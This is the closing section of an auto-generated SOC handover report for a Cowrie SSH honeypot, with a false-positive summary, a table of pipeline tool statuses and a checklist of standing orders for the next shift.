## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 37 cases |
| Tool 34  | Credential Extractor        | ✅ 18 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 7 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (2.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 7 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 6 recon entry/entries in table (2 group(s) consolidating 22 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-10T07:29:02Z_
